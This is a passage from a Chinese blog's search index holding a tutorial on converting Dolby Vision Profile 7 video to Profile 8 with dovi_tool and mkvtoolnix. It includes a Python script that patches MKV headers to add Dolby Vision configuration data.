<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>将 Dolby Vision Profile 7 转换为 Profile 8</title>
      <link href="/2023/02/16/%E5%B0%81%E8%A3%85DV/"/>
      <url>/2023/02/16/%E5%B0%81%E8%A3%85DV/</url>
      
        <content type="html"><![CDATA[<h2 id="关于-Dolby-Vision"><a href="#关于-Dolby-Vision" class="headerlink" title="关于 Dolby Vision"></a>关于 Dolby Vision</h2><p>Dolby Vision 是一种 HDR 标准，能提供比 HDR10 更高的动态范围，高达 12bit 的色彩，动态元数据等等。Dolby Vision 内部本身又分为许多标准，比如流媒体广泛使用的 Profile 5，蓝光原盘中的 Profile 7，流媒体或 Apple 设备拍摄的 Profile 8。</p><h3 id="Profile-7"><a href="#Profile-7" class="headerlink" title="Profile 7"></a>Profile 7</h3><p>Profile 7 是双层杜比视界，一般存在于蓝光原盘中，解析 Profile 7 需要播放机的SoC中存在相关授权，直接劝退了 infuse 等一众移动端播放器，解析不了 Profile 7 则只能按 HDR10 的标准解析，效果会有折扣。</p><p>Profile 7 中一般分为 BL，RPU，EL，</p><p>BL ：基础层，一个基本的视频，一个基本的“原料”。通常是一个YUV420 10bit HDR10视频，普通的设备播放【Dolby Vision】视频无法激活【Dolby Vision】，原因就是播放器只能读取到这个BL层。这也是为什么【Dolby Vision】兼容HDR10的原因，即在普通播放机上播放杜比视界的视频时，会以兼容模式HDR10输出。</p><p>RPU：杜比视界中必须要有的一个部分，通常里面包含着各类的“指导”数据，用于明确告知电视，如何转换颜色空间，HDR的动态映射（tone mapping）等等。用比喻的说法RPU是一个视频处理条例，明确写着BL层的视频应该如何渲染及显示。</p><p>EL：简单的理解这是一个扩展层。一个标准的杜比视界，会把YUV420 10bit 的BL层视频，合成YUV422 12bit 视频。这个EL层就是扩展数据，用于扩展BL的视频有效信息。 让最终成品有更多的色阶，更多的颜色，更大的对比度范围。</p><p>所以称为双层杜比视界。</p><p>我们可以使用 mediainfo 或 BDinfo 查看是否含有 DV Profile 7：</p><p><img src="https://cdn.starryloki.com/2023/07/67f61fd6c1271bb9faea8bf7e4ddb09f.png" alt="image-20230214195045543"></p><p>如上图红色框内则是含有 RPU+EL 的额外视频轨道，播放时会解析这条轨道并叠加到上面的  BL层，一般称为双轨双层。</p><p>比较新的原盘 REMUX 也会含有 DV Profile 7，我们用 mediainfo 查看：</p><p><img src="https://cdn.starryloki.com/2023/07/eb8a8fe7ecf3b852aa0484351f87e778.png" alt="image-20230216192931201"></p><p>可以发现只有一条视频轨道，整合了 Profile 7 和 HDR 10 的信息，这种一般称为单轨双层。</p><h3 id="Profile-5-和-Profile-8"><a href="#Profile-5-和-Profile-8" class="headerlink" title="Profile 5 和 Profile 8"></a>Profile 5 和 Profile 8</h3><p>Profile 5 和 Profile 8 都是单层杜比视界，<strong>就是 BL+RPU的组合，也称为Dolby Vision MEL - 迷你杜比视界层。</strong>这种杜比视界只有“指导”数据，大部分的内容是HDR的动态映射（tone mapping）的dynamic metadata。与原盘的双层杜比视界相比缺少了 12bit 的色彩数据，一般用于流媒体以及手机拍摄的杜比视界视频，虽然效果不如 Profile 7，但是却可以被 infuse 解析，效果也比一般的 HDR 10 要好。</p><h2 id="将-Profile-7-转换为-Profile-8"><a href="#将-Profile-7-转换为-Profile-8" class="headerlink" title="将 Profile 7 转换为 Profile 8"></a>将 Profile 7 转换为 Profile 8</h2><p>为了能在便携设备观看杜比视界，转为 Profile 8 是首选，在不支持杜比视界的播放器上 Profile 5 会出现严重的偏色，而 Profile 8 则能以 HDR10 的格式播放。</p><p><a href="https://github.com/quietvoid/dovi_tool">dovi_tool</a> 是一个开源的杜比视界编辑工具，可以提取，合并，转换杜比视界数据。</p><p>如果目标文件为蓝光原盘，则用 tsMuxer 解压出两条视频轨道，分别为 BL 和 EL，得到两个 hevc文件后使用 dovi_tool 合并并转换为 Profile 8:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dovi_tool -m 2 mux --bl BL.hevc --el EL.hevc --discard<br></code></pre></td></tr></table></figure><p>这样会得到一个 <code>BL_RPU.hevc</code>，这个文件已经包含了原本的 BL 层以及 Profile 8 的 RPU</p><p>如果目标文件为包含杜比视界的原盘 REMUX，则用 mkvextra 解压出视频轨道，并用 dovi_tool 转换：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dovi_tool -m 2 convert --discard file.hevc<br></code></pre></td></tr></table></figure><p>这样也会得到一个 <code>BL_RPU.hevc</code> , 和上面得到的一样，接着再用 mkvtoolnix 将 <code>BL_RPU.hevc</code> 封装进 mkv，此时可以对该 mkv 添加音轨以及字幕。</p><h3 id="如果mediainfo不显示DV"><a href="#如果mediainfo不显示DV" class="headerlink" title="如果mediainfo不显示DV"></a>如果mediainfo不显示DV</h3><p>受限于一些原盘的DV格式，需要修改一下mkv头才能正常识别DV，此时的 mkv 要在标题增加 37 个下划线，再用一个脚本修复一下，输出 mkv 后，用脚本处理：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bitstring <span class="hljs-keyword">import</span> BitArray<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Crc32Base</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-built_in">super</span>(Crc32Base, self).__init__()<br>self.REFLECT_BIT_ORDER_TABLE = (<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xE0</span>,<br><span class="hljs-number">0x10</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xF0</span>,<br><span class="hljs-number">0x08</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xE8</span>,<br><span class="hljs-number">0x18</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xF8</span>,<br><span class="hljs-number">0x04</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xE4</span>,<br><span class="hljs-number">0x14</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xF4</span>,<br><span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xEC</span>,<br><span class="hljs-number">0x1C</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xFC</span>,<br><span class="hljs-number">0x02</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xE2</span>,<br><span class="hljs-number">0x12</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF2</span>,<br><span class="hljs-number">0x0A</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xEA</span>,<br><span class="hljs-number">0x1A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xFA</span>,<br><span class="hljs-number">0x06</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xE6</span>,<br><span class="hljs-number">0x16</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xF6</span>,<br><span class="hljs-number">0x0E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xEE</span>,<br><span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xFE</span>,<br><span class="hljs-number">0x01</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE1</span>,<br><span class="hljs-number">0x11</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xF1</span>,<br><span class="hljs-number">0x09</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xE9</span>,<br><span class="hljs-number">0x19</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xF9</span>,<br><span class="hljs-number">0x05</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xE5</span>,<br><span class="hljs-number">0x15</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xF5</span>,<br><span class="hljs-number">0x0D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xED</span>,<br><span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFD</span>,<br><span class="hljs-number">0x03</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xE3</span>,<br><span class="hljs-number">0x13</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xF3</span>,<br><span class="hljs-number">0x0B</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xEB</span>,<br><span class="hljs-number">0x1B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFB</span>,<br><span class="hljs-number">0x07</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xE7</span>,<br><span class="hljs-number">0x17</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xF7</span>,<br><span class="hljs-number">0x0F</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xEF</span>,<br><span class="hljs-number">0x1F</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>,<br>)<br>self._width = <span class="hljs-number">0</span><br>self._poly = <span class="hljs-number">0x00</span><br>self._initvalue = <span class="hljs-number">0x00</span><br>self._reflect_input = <span class="hljs-literal">False</span><br>self._reflect_output = <span class="hljs-literal">False</span><br>self._xor_output = <span class="hljs-number">0x00</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reflectbitorder</span>(<span class="hljs-params">self, width, value</span>):<br>binstr = (<span class="hljs-string">&quot;0&quot;</span> * width + <span class="hljs-built_in">bin</span>(value)[<span class="hljs-number">2</span>:])[-width:]<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(binstr[::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">self, data</span>):<br>crc = self._initvalue<br><br><span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br><span class="hljs-keyword">if</span> self._reflect_input:<br>byte = self.REFLECT_BIT_ORDER_TABLE[byte]<br>crc ^= (byte &lt;&lt; <span class="hljs-number">24</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>):<br><span class="hljs-keyword">if</span> crc &amp; <span class="hljs-number">0x80000000</span>:<br>crc = (crc &lt;&lt; <span class="hljs-number">1</span>) ^ self._poly<br><span class="hljs-keyword">else</span>:<br>crc = (crc &lt;&lt; <span class="hljs-number">1</span>)<br>crc &amp;= <span class="hljs-number">0xFFFFFFFF</span><br><span class="hljs-keyword">if</span> self._reflect_output:<br>crc = self.reflectbitorder(self._width, crc)<br>crc ^= self._xor_output<br><span class="hljs-keyword">return</span> crc<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Crc32Mpeg2</span>(<span class="hljs-title class_ inherited__">Crc32Base</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-built_in">super</span>(Crc32Mpeg2, self).__init__()<br>self._width = <span class="hljs-number">32</span><br>self._poly = <span class="hljs-number">0x04C11DB7</span><br>self._initvalue = <span class="hljs-number">0xFFFFFFFF</span><br>self._reflect_input = <span class="hljs-literal">False</span><br>self._reflect_output = <span class="hljs-literal">False</span><br>self._xor_output = <span class="hljs-number">0x00000000</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Crc32</span>(<span class="hljs-title class_ inherited__">Crc32Base</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-built_in">super</span>(Crc32, self).__init__()<br>self._width = <span class="hljs-number">32</span><br>self._poly = <span class="hljs-number">0x04C11DB7</span><br>self._initvalue = <span class="hljs-number">0xFFFFFFFF</span><br>self._reflect_input = <span class="hljs-literal">True</span><br>self._reflect_output = <span class="hljs-literal">True</span><br>self._xor_output = <span class="hljs-number">0xFFFFFFFF</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MKV_Patcher</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,mkv_data</span>):<br><span class="hljs-built_in">super</span>(MKV_Patcher, self).__init__()<br>self.mkv_data = mkv_data<br>self.elements = OrderedDict([<br>(<span class="hljs-string">&quot;SEEK_HEAD&quot;</span>,BitArray(<span class="hljs-string">&quot;0x114D9B74&quot;</span>)),<br><span class="hljs-comment"># (&quot;SEEK_HEAD_CRC&quot;,BitArray(&quot;0xBF&quot;)),</span><br>(<span class="hljs-string">&quot;SEEK_POSITION&quot;</span>,BitArray(<span class="hljs-string">&quot;0x53AC&quot;</span>)),<br>(<span class="hljs-string">&quot;VOID&quot;</span>,BitArray(<span class="hljs-string">&quot;0xEC&quot;</span>)),<br>(<span class="hljs-string">&quot;INFO&quot;</span>,BitArray(<span class="hljs-string">&quot;0x1549A966&quot;</span>)),<br><span class="hljs-comment"># (&quot;INFO_CRC&quot;,BitArray(&quot;0xBF&quot;)),</span><br>(<span class="hljs-string">&quot;TITLE&quot;</span>,BitArray(<span class="hljs-string">&quot;0x7BA9&quot;</span>)),<br><span class="hljs-comment"># (&quot;MUXING_APP&quot;,BitArray(&quot;0x4D80&quot;)),</span><br><span class="hljs-comment"># (&quot;WRITING_APP&quot;,BitArray(&quot;0x5741&quot;)),</span><br>(<span class="hljs-string">&quot;TRACKS&quot;</span>,BitArray(<span class="hljs-string">&quot;0x1654AE6B&quot;</span>)),<br><span class="hljs-comment"># (&quot;TRACKS_CRC&quot;,BitArray(&quot;0xBF&quot;)),</span><br>(<span class="hljs-string">&quot;TRACK_ENTRY&quot;</span>,BitArray(<span class="hljs-string">&quot;0xAE&quot;</span>)),<br>(<span class="hljs-string">&quot;TRACK_NUMBER&quot;</span>,BitArray(<span class="hljs-string">&quot;0xD7&quot;</span>)),<br>])<br>self.parsed_elements = OrderedDict()<br>self.buffer_pos = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_len_mark</span>(<span class="hljs-params">self, length</span>):<br><span class="hljs-keyword">return</span> BitArray(uint=<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">8</span> - <span class="hljs-built_in">int</span>(length / <span class="hljs-number">8</span>)),length=<span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">var_int_len</span>(<span class="hljs-params">self, first_byte</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, <span class="hljs-number">64</span> + <span class="hljs-number">8</span>):<br><span class="hljs-keyword">if</span> (self.get_len_mark(i) &amp; first_byte[:<span class="hljs-number">8</span>]):<br><span class="hljs-keyword">return</span> i<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_variable_size_int</span>(<span class="hljs-params">self</span>):<br>pos = self.buffer_pos<br>length = self.var_int_len(self.mkv_data[pos:pos + <span class="hljs-number">8</span>])<br>parsedValue = BitArray(uint=(self.mkv_data[pos:pos + <span class="hljs-number">8</span>] &amp; (~self.get_len_mark(length))).uint,length=length)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>,length,<span class="hljs-number">8</span>):<br>parsedValue = (parsedValue &lt;&lt; <span class="hljs-number">8</span>) | BitArray(uint=self.mkv_data[pos + i: pos + i + <span class="hljs-number">8</span>].uint,length=length)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">dict</span>(value=parsedValue.uint * <span class="hljs-number">8</span>,octet_length=length)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_variable_size_int</span>(<span class="hljs-params">self, el,uint_value, length</span>):<br>new_data = BitArray(uint=<span class="hljs-built_in">int</span>(uint_value / <span class="hljs-number">8</span>), length=length)<br>lenMark = BitArray(uint=self.get_len_mark(length).uint, length=length) &lt;&lt; length - <span class="hljs-number">8</span><br><span class="hljs-keyword">return</span> new_data | lenMark<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_elements</span>(<span class="hljs-params">self</span>):<br>counter = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> self.elements.keys():<br>stop = <span class="hljs-literal">False</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop:<br>el_property = <span class="hljs-built_in">dict</span>()<br>el_property[<span class="hljs-string">&quot;id&quot;</span>] = self.elements[element]<br>offset = self.mkv_data.find(el_property[<span class="hljs-string">&quot;id&quot;</span>],start=self.buffer_pos,bytealigned=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">if</span> offset:<br>el_property[<span class="hljs-string">&quot;offset&quot;</span>] = offset[<span class="hljs-number">0</span>]<br>self.buffer_pos = offset[<span class="hljs-number">0</span>] + el_property[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-built_in">len</span><br>el_property[<span class="hljs-string">&quot;size&quot;</span>] = self.read_variable_size_int()<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;SEEK_POSITION&quot;</span> <span class="hljs-keyword">in</span> element:<br>parsed_element = <span class="hljs-string">&quot;&#123;&#125;_&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(element,counter)<br>counter += <span class="hljs-number">1</span><br>stop = <span class="hljs-literal">False</span><br><span class="hljs-keyword">else</span>:<br>parsed_element = element<br>stop = <span class="hljs-literal">True</span><br>self.parsed_elements[parsed_element] = el_property<br><span class="hljs-keyword">else</span>:<br>stop = <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_element_properties</span>(<span class="hljs-params">self,el</span>):<br>el_property = self.parsed_elements[el]<br>el_size = el_property[<span class="hljs-string">&quot;size&quot;</span>][<span class="hljs-string">&quot;value&quot;</span>]<br>el_octet_length = el_property[<span class="hljs-string">&quot;size&quot;</span>][<span class="hljs-string">&quot;octet_length&quot;</span>]<br>el_size_pos = el_property[<span class="hljs-string">&quot;offset&quot;</span>] + el_property[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-built_in">len</span><br>el_data_pos = el_size_pos + el_octet_length<br><span class="hljs-keyword">return</span> (el_size,el_octet_length,el_size_pos,el_data_pos)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_elements</span>(<span class="hljs-params">self,injected_data_length</span>):<br>crc32 = Crc32()<br>elements = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self.parsed_elements.keys() <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;SEEK_POSITION&quot;</span> <span class="hljs-keyword">in</span> x]<br><span class="hljs-comment"># elements += [&quot;TRACK_ENTRY&quot;,&quot;TRACKS&quot;,&quot;TRACKS_CRC&quot;,&quot;INFO&quot;,&quot;TITLE&quot;,&quot;INFO_CRC&quot;,&quot;SEEK_HEAD_CRC&quot;]  # FFMPEG</span><br>elements += [<span class="hljs-string">&quot;TRACK_ENTRY&quot;</span>,<span class="hljs-string">&quot;TRACKS&quot;</span>,<span class="hljs-string">&quot;INFO&quot;</span>,<span class="hljs-string">&quot;TITLE&quot;</span>]  <span class="hljs-comment"># MKVTOOLNIX</span><br><span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> elements:<br>new_size = <span class="hljs-literal">None</span><br>size,octet_length,size_pos,data_pos = self.get_element_properties(el)<br><span class="hljs-keyword">if</span> el == <span class="hljs-string">&quot;TITLE&quot;</span>:<br>new_size = size - injected_data_length<br><span class="hljs-keyword">del</span> self.mkv_data[data_pos + size - injected_data_length:data_pos + size]<br><span class="hljs-keyword">elif</span> el == <span class="hljs-string">&quot;INFO&quot;</span>:<br>new_size = size - injected_data_length<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;SEEK_POSITION&quot;</span> <span class="hljs-keyword">in</span> el:<br>offset = size_pos - self.parsed_elements[el][<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-built_in">len</span><br>seek_id = self.mkv_data[offset - <span class="hljs-number">32</span>:offset]<br><span class="hljs-keyword">if</span> seek_id == self.elements[<span class="hljs-string">&quot;TRACKS&quot;</span>]:<br>old_data = self.mkv_data[data_pos:data_pos + size]<br>new_data = BitArray(uint=<span class="hljs-built_in">int</span>(old_data.uint - (injected_data_length / <span class="hljs-number">8</span>)), length=old_data.<span class="hljs-built_in">len</span>)<br>self.mkv_data.overwrite(new_data, data_pos)<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;CRC&quot;</span> <span class="hljs-keyword">in</span> el:<br>parent_element = el.replace(<span class="hljs-string">&quot;_CRC&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>parent_size,_,_,parent_data_pos = self.get_element_properties(parent_element)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TRACKS&quot;</span> <span class="hljs-keyword">in</span> parent_element:<br>parent_size += injected_data_length<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;INFO&quot;</span> <span class="hljs-keyword">in</span> parent_element:<br>parent_size -= injected_data_length<br>parent_data = self.mkv_data[parent_data_pos + <span class="hljs-number">48</span>:parent_data_pos + parent_size]<br>crc = BitArray(uintle=crc32.calc(<span class="hljs-built_in">bytearray</span>(parent_data.<span class="hljs-built_in">bytes</span>)),length=<span class="hljs-number">32</span>)<br>self.mkv_data.overwrite(crc, data_pos)<br><span class="hljs-keyword">else</span>:<br>new_size = size + injected_data_length<br><br><span class="hljs-keyword">if</span> new_size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>new_variable_size = self.generate_variable_size_int(el,new_size,octet_length)<br>self.mkv_data.overwrite(new_variable_size, size_pos)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject_dolby_vision</span>(<span class="hljs-params">self,dv_data</span>):<br>self.init_elements()<br>size,_,_,data_pos = self.get_element_properties(<span class="hljs-string">&quot;TRACK_NUMBER&quot;</span>)<br>inject_pos = data_pos + size<br>self.mkv_data.insert(dv_data, inject_pos)<br>self.patch_elements(dv_data.<span class="hljs-built_in">len</span>)<br><span class="hljs-keyword">return</span> self.mkv_data<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>in_file = sys.argv[<span class="hljs-number">1</span>]<br>dolby_vision_data = BitArray(<span class="hljs-string">&quot;0x41E4A241E7846476764341ED98010010351000000000000000000000000000000000000000&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(in_file, <span class="hljs-string">&#x27;r+b&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>mkv_data = BitArray(<span class="hljs-built_in">bytes</span>=f.read(<span class="hljs-number">1024</span> * <span class="hljs-number">20</span>))<br>mkv_patcher = MKV_Patcher(mkv_data)<br>patched_data = mkv_patcher.inject_dolby_vision(dolby_vision_data)<br>f.seek(<span class="hljs-number">0</span>)<br>f.write(patched_data.<span class="hljs-built_in">bytes</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nFile patched correctly ... at least I hope so :)&quot;</span>)<br></code></pre></td></tr></table></figure><p>修复完成后 mkv 的标题应该是被去除了，此时可以对该 mkv 添加音轨以及字幕。</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>最终我们可以得到一个 包含 DV Profile 8 的原盘 REMUX，用 mediafinfo 可以看到：</p><p><img src="https://cdn.starryloki.com/2023/07/fad83e2811dbd67798e53ad5e1912c26.png" alt="image-20230216210550821"></p><p>在 infuse 中顺利点亮 DV：</p><p><img src="https://cdn.starryloki.com/2023/07/0015a04ce23554eb1f13be87a3d55546.jpeg" alt="IMG_DE0797DA0A3B-1"></p><p>这里讨论的是制作包含杜比视界的原盘 REMUX，如果需要压制视频，猜测需要提取RPU.bin，压制完成后再进行合并。</p><p>一个将原盘 remux 自动化处理的脚本：</p><figure 